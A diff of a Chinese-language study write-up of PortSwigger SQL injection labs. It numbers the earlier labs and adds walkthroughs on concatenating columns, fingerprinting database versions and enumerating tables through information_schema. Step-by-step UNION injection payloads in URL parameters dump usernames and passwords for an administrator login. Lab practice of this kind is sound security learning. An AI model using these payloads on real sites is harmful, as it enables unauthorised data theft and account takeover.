@@ -36,7 +36,7 @@ description: 基于portswigger靶场学习并练习SQL注入
 - `--`是SQL注释符，可以注释掉后面的内容
 - 在使用`OR 1=1`的时候要小心，如果在update或delete语句中使用，可能会导致数据意外丢失
 
-### 🧪实验：WHERE子句中的SQL注入漏洞允许检索隐藏数据
+### 🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据
 
 #### 实验说明
 
@@ -70,7 +70,7 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
   # 此查询将返回username为administrator的用户的详细信息，而不需要密码
   ```
 
-### 🧪实验：允许绕过登录的SQL注入漏洞
+### 🧪实验2：允许绕过登录的SQL注入漏洞
 
 #### 实验说明
 
@@ -130,7 +130,7 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
     - 与`ORDER BY`子句一样，应用程序可能在HTTP响应中返回数据库错误，也可能返回一般的错误响应，甚至可能不返回任何错误提示。
     - 但如果 NULL 值的数量同结果集中列的数量匹配，数据库会在结果集中返回额外的列，其中每一列会包含 NULL 值。对 HTTP 响应的影响取决于应用程序的代码实现。如果够幸运的话，你可以在响应中看到其他内容，例如 HTML 表格的额外行。否则，NULL 值可能触发其他错误，例如 NullPointerException。最坏的情况下，响应可能与由不正确的 NULL 数引起的响应没有区别，使得确定列数的此方法无效。
 
-### 🧪实验：SQL注入UNION攻击，确定查询返回的列数
+### 🧪实验3：SQL注入UNION攻击，确定查询返回的列数
 
 #### 实验说明
 
@@ -167,7 +167,7 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
   ' UNION SELECT NULL,NULL,NULL,'a'--
   ```
 
-### 🧪实验：SQL注入UNION攻击，查找具有有用数据类型的列
+### 🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列
 
 #### 实验说明
 
@@ -204,7 +204,7 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 - 为了执行这个攻击，需要`users`表及列的名称。如果没有，可以猜测表和列的名称。所有现代数据库都提供了检查数据库结构的方法，能够通过这些方法来确定表和列的名称。
 
 
-### 🧪实验：SQL注入UNION攻击，从其他表中检索数据
+### 🧪实验5：SQL注入UNION攻击，从其他表中检索数据
 
 #### 实验说明
 
@@ -231,6 +231,177 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 - 使用获得的用户名和密码登录成功
 - 完成实验✅
 
+## 在单个列中检索多个值
+
+- 在某些情况下，上一个示例中的查询可能只返回单个列。通过将值连接在一起，可以在此单个列中同时检索多个值。可以包含分隔符以区分组合值。
+- 例子：
+  ```sql
+  ' UNION SELECT username || '~' || password FROM users--
+  # 在Oracle数据库中，可以使用`||`连接运算符来连接值
+  # 将`username`和`password`连接在一起，并使用`~`作为分隔符，查询的结果包含所有用户名和密码例如：
+  # ···
+  # administrator~s3cure
+  # wiener~peter
+  # ···
+  ```
+- 不同的数据库使用不同的语法来执行字符串连接。详见[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+
+### 🧪实验6：SQL注入UNION攻击，在单个列中检索多个值
+
+#### 实验说明
+
+- 本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。
+- 数据库包含一个名为`users`的表，其中包含`username`和`password`列。
+- 任务：执行SQL注入UNION攻击，检索`username`和`password`列的数据，并使用这些信息以`administrator`的身份登录。
+
+#### 解题过程
+
+- 首先确认列数：
+  ``` sql
+  ?category=Lifestyle' UNION SELECT NULL-- 
+  ?category=Lifestyle' UNION SELECT NULL,NULL-- 
+  # 成功，说明返回的列数为2
+  ```
+- 然后确认每一列的类型：
+  ```sql
+  ?category=Lifestyle' UNION SELECT 'a',NULL-- 
+  # 报错，说明第一列是不是字符串类型
+  ?category=Lifestyle' UNION SELECT NULL,'a'-- 
+  # 成功，说明第二列是字符串类型
+  ```
+- 只有一列是字符串，因此需要在单个列中检索`username`和`password`拼接值。
+- 猜测这是一个mysql数据库，因此使用`CONCAT`函数进行拼接：
+  ```sql
+  ?category=Lifestyle' UNION SELECT NULL,CONCAT(username, '~', password) FROM users-- 
+  ```
+- 查到用户名密码，可以使用administrator登录
+  ![](LAB6-1-获得用户名密码.png)
+- 完成实验✅
+
+
+## 检查SQL注入攻击中的数据库
+
+- 要利用SQL注入漏洞，通常需要查找有关数据库的信息，这包括：
+  - 数据库软件的类型和版本
+  - 数据库包含的表和列
+
+### 检查数据库的版本和类型
+
+以下是一些用来确定某些常用数据库类型的数据库版本：
+
+| 数据库类型 | 查询|
+| --- | --- |
+| Microsoft，MySQL | `SELECT @@version` |
+| Oracle | `SELECT * FROM v$version` |
+| PostgreSQL | `SELECT version()` |
+
+- 例子：
+  - 使用`UNION SELECT @@version,NULL--`来检查数据库的版本
+  - 返回的输出结果如下：
+    ```
+    Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+    Mar 18 2018 09:11:49
+    Copyright (c) Microsoft Corporation
+    Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+    ```
+  - 可以看到数据库的版本是`Microsoft SQL Server 2016`
+
+
+### 🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）
+
+#### 实验说明
+
+- 本实验在产品类别筛选器中包含一个SQL注入漏洞。可以使用UNION攻击从其他表中检索数据。
+- 任务：执行SQL注入攻击，确定数据库的类型和版本。
+
+#### 解题过程
+
+- 首先，确定返回的列数：
+  ```sql
+  ?category=Pets' UNION SELECT NULL-- 
+  ?category=Pets' UNION SELECT NULL,NULL--  
+  ?category=Pets' UNION SELECT NULL,NULL--  
+  # 不成功。。
+  ```
+  <!-- ![](LAB7-1-查询返回的列数.png) -->
+
+
+### 列出数据库的内容
+
+- 大多数数据库类型（Oracle除外），都有一个名为`information_schema`的系统表，其中包含有关数据库的信息。可以使用这个表来列出数据库中的表和列。
+- 例：
+  - 可以查询`information_schema.tables`表来列出数据库中的表:
+    ```sql
+    SELECT * FROM information_schema.tables
+    ```
+  - 结果示例：
+    ```
+    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+    =====================================================
+    MyDatabase     dbo           Products    BASE TABLE
+    MyDatabase     dbo           Users       BASE TABLE
+    MyDatabase     dbo           Feedback    BASE TABLE
+    ```
+  - 可以查询`information_schema.columns`表来列出数据库中的列:
+    ```sql
+    SELECT * FROM information_schema.columns WHERE table_name = 'users'
+    ```
+  - 结果示例：
+    ```
+    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+    =================================================================
+    MyDatabase     dbo           Users       UserId       int
+    MyDatabase     dbo           Users       Username     varchar
+    MyDatabase     dbo           Users       Password     varchar
+    ```
+
+
+### 🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容
+
+#### 实验说明
+
+- 本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果将在应用程序的响应中返回，可以使用UNION攻击从其他表中检索数据。
+- 应用程序具有登录功能，数据库包含一个保存用户名和密码的表。
+- 任务：执行SQL注入攻击，确定表的名称和列的名称，查询所有用户的用户名和密码，以`administrator`的身份登录。
+
+
+#### 解题过程
+
+- 首先确定原始查询返回的列数：
+  ```sql
+  ?category=Gifts' UNION SELECT NULL,NULL-- 
+  # 返回正常结果，所以返回的列数为2
+  ```
+- 然后确定每一列的类型：
+  ```sql
+  ?category=Gifts' UNION SELECT 'a',NULL-- 
+  ?category=Gifts' UNION SELECT NULL,'a'-- 
+  # 两个都成功，说明两列都是字符串类型
+  ```
+- 查询数据库中的表：
+  ```sql
+  ?category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
+  ```
+  ![](./WriteUp-portswigger-SQL注入系列/LAB8-1-查询数据库中的所有表.png)
+- 发现一个名为`users_kdzjph`的表，猜测是目标表，尝试查询表中的列：
+  ```sql
+  ?category=Gifts' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'pg_user_mappings'--  
+  ?category=Gifts' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'users_kdzjph'--  
+  ```
+  ![](LAB8-2-查看users_kdzjph的列.png)
+- 查询到了`password_ifndxh`和`username_aeoisd`列，查询所有用户的用户名和密码：
+  ```sql
+  ?category=Gifts' UNION SELECT username_aeoisd,password_ifndxh FROM users_kdzjph--  
+  ```
+  ![](LAB8-3-查询到所有用户名和密码.png)
+- 使用获得的用户名和密码登录
+  ![](LAB8-4-登录成功.png)
+- 完成实验✅
+
+## SQL盲注
+
+x
 
 
 
